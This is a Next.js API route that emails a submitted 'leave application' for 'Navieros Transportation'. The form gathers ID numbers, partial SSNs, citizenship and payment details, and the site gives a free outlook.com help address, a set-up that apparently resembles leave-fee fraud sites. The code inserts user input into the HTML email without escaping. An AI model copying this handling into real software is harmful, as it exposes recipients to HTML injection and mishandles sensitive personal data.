import { type NextRequest, NextResponse } from "next/server"
import { Resend } from "resend"
import { RESEND_CONFIG, validateConfig } from "@/lib/config"

const resend = new Resend(RESEND_CONFIG.API_KEY)

export async function POST(request: NextRequest) {
  try {
    // Validate configuration
    const configValidation = validateConfig()
    if (!configValidation.isValid) {
      console.error("Configuration errors:", configValidation.errors)
      return NextResponse.json(
        {
          success: false,
          message: "Email service not configured properly",
          errors: configValidation.errors,
        },
        { status: 500 },
      )
    }

    const applicationData = await request.json()

    if (!applicationData) {
      return NextResponse.json({ success: false, message: "No application data provided" }, { status: 400 })
    }

    // Format the email content
    const emailContent = formatApplicationData(applicationData)

    // Send email using Resend
    const { data, error } = await resend.emails.send({
      from: RESEND_CONFIG.FROM_EMAIL,
      // ⚠️ EMAIL CONFIGURATION POINT #3 ⚠️
      // This is where completed leave applications will be sent
      // IMPORTANT: Use your verified Resend email address here
      to: [RESEND_CONFIG.ADMIN_EMAIL], // Your verified Resend email address
      subject: "New Leave Application Submission - Navieros Transportation",
      html: emailContent,
    })

    if (error) {
      console.error("Resend error:", error)
      return NextResponse.json({ success: false, message: "Failed to send email" }, { status: 500 })
    }

    console.log("Email sent successfully:", data)
    return NextResponse.json({
      success: true,
      message: "Application submitted successfully",
      emailId: data?.id,
    })
  } catch (error) {
    console.error("Error processing application:", error)
    return NextResponse.json({ success: false, message: "Failed to submit application" }, { status: 500 })
  }
}

function formatApplicationData(data: any) {
  const { step1, step2, step3, submissionDate } = data

  return `
    <!DOCTYPE html>
    <html>
      <head>
        <meta charset="utf-8">
        <title>Leave Application - Navieros Transportation</title>
        <style>
          body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 20px; }
          .container { max-width: 600px; margin: 0 auto; background: #fff; }
          .header { background: #2c3e50; color: white; padding: 20px; text-align: center; }
          .content { padding: 20px; }
          .section { margin-bottom: 30px; }
          .section h2 { color: #34495e; border-bottom: 2px solid #3498db; padding-bottom: 10px; margin-bottom: 15px; }
          table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
          td { padding: 12px; border: 1px solid #ddd; }
          .label { background: #f8f9fa; font-weight: bold; width: 40%; }
          .value { background: #fff; }
          .consent { background: #e8f5e8; padding: 15px; border-radius: 5px; margin: 15px 0; }
          .footer { background: #ecf0f1; padding: 15px; text-align: center; font-size: 12px; color: #7f8c8d; }
          .highlight { background: #fff3cd; padding: 10px; border-radius: 5px; margin: 10px 0; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>🚢 New Leave Application</h1>
            <p>Navieros Transportation System</p>
          </div>
          
          <div class="content">
            <div class="highlight">
              <strong>📅 Submission Date:</strong> ${new Date(submissionDate).toLocaleString()}
              <br>
              <strong>🆔 Reference ID:</strong> NAV-${Date.now().toString().slice(-6)}
            </div>
            
            <div class="section">
              <h2>📋 Initial Application Details</h2>
              <table>
                <tr><td class="label">Applied Before:</td><td class="value">${step1?.appliedBefore || "N/A"}</td></tr>
                <tr><td class="label">US Citizen:</td><td class="value">${step1?.usCitizen || "N/A"}</td></tr>
                <tr><td class="label">Active Contract:</td><td class="value">${step1?.activeContract || "N/A"}</td></tr>
                <tr><td class="label">Leave Type:</td><td class="value">${step1?.leaveType || "N/A"}</td></tr>
                <tr><td class="label">Applying for Other:</td><td class="value">${step1?.applyingForOther || "N/A"}</td></tr>
                <tr><td class="label">Contact Email:</td><td class="value">${step1?.email || "N/A"}</td></tr>
              </table>
            </div>
            
            <div class="section">
              <h2>👤 Personal & Leave Details</h2>
              <table>
                <tr><td class="label">Full Name:</td><td class="value">${step2?.firstName || ""} ${step2?.lastName || ""}</td></tr>
                <tr><td class="label">ID Number:</td><td class="value">${step2?.idNumber || "N/A"}</td></tr>
                <tr><td class="label">SSN Last 4:</td><td class="value">****${step2?.ssnLast4 || "N/A"}</td></tr>
                <tr><td class="label">Request Date:</td><td class="value">${step2?.requestDate || "N/A"}</td></tr>
                <tr><td class="label">Position:</td><td class="value">${step2?.position || "N/A"}</td></tr>
                <tr><td class="label">Travel Method:</td><td class="value">${step2?.travelMethod || "N/A"}</td></tr>
                <tr><td class="label">Reason for Leave:</td><td class="value">${step2?.reasonForLeave || "N/A"}</td></tr>
                <tr><td class="label">Ticket Status:</td><td class="value">${step2?.ticketStatus || "N/A"}</td></tr>
                <tr><td class="label">Payment Method:</td><td class="value">${step2?.paymentMethod || "N/A"}</td></tr>
              </table>
            </div>
            
            <div class="section">
              <h2>🔐 Verification Details</h2>
              <table>
                <tr><td class="label">Verification Email:</td><td class="value">${step3?.verifyEmail || "N/A"}</td></tr>
                <tr><td class="label">Verification ID:</td><td class="value">${step3?.verifyIdNumber || "N/A"}</td></tr>
              </table>
            </div>
            
            <div class="consent">
              <h3>✅ Consent Confirmations</h3>
              <p><strong>Information Accuracy:</strong> ${step2?.accurateInfo ? "✅ Confirmed" : "❌ Not Confirmed"}</p>
              <p><strong>Approval Acknowledgment:</strong> ${step2?.approvalAck ? "✅ Acknowledged" : "❌ Not Acknowledged"}</p>
            </div>
          </div>
          
          <div class="footer">
            <p>This application was submitted through the Navieros Transportation leave application system.</p>
            <p>For inquiries, contact: navieroshelpcenter@outlook.com</p>
          </div>
        </div>
      </body>
    </html>
  `
}
